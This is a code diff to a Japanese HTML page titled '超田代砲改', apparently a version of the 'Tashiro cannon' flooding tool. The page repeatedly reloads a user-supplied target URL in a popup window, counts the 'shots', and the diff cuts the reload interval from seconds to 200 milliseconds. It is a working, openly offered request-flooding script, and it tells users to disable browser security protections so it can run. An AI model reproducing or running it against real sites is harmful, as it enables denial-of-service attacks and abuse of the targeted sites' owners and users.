@@ -66,27 +66,29 @@
         </style>
         <script>
         function closewin(){
-            self.close();
+            wind.close();
+            document.location.reload();
         }
         </script>
-        <script>
-        resizeTo(600,600);
-        </script>
-        <body text="#000000" bgcolor="#FFFFFF">
+    </head>
+    <body text="#000000" bgcolor="#FFFFFF">
         <div align="center">
             <script>
             var wind = "";
             var add = "";
             function display(){
                 add = document.f.address.value;
-                wind = window.open(add, 'san', 'width=300, height=300');
+                wind = window.open(add, 'san', 'width=400, height=400');
+                if (f.inter.value < 200) {
+                    f.inter.value = "200";
+                }
                 tashiro();
             }
             
             function tashiro(){
                 wind.location = add;
                 document.f.fired.value++;
-                setTimeout("tashiro();", f.inter.value * 1000);
+                setTimeout("tashiro();", f.inter.value);
             }
             </script>
             <font color="#000000" size="5"><b><u>超田代砲改 Ver.1.3 プチ改造大東亜共栄砲</u></b></font> <BR><BR>
@@ -94,12 +96,12 @@
                 <font color="#000000">目標アドレス:</font><br>
                 <input size="100" value="ここに目標URLを入れる" name="address"><br><br>
                 <font color="#000000">砲撃間隔:</font><br>
-                <input size="5" value="1" name="inter">秒<BR><br>
+                <input size="5" value="200" name="inter">ミリ秒<BR><br>
                 <font color="#000000">既砲撃回数:</font><br>
                 <input value="0" name="fired"><br><input onclick="display()" type="button" value="砲撃開始">
             </form>
             <form>
-                <input onclick="closewin()" type=button value="砲撃終了">
+                <input onclick="closewin()" type="button" value="砲撃終了">
             </form><br><br>
             <font size="2" color="pink"><u><font color="#FF0000">※注意：WidowsXPSP2ではｾｷｭﾘﾃｨｰ保護の制限を解除してください。<br>
             ブロックされているコンテンツの許可をクリックしてください</font></u>
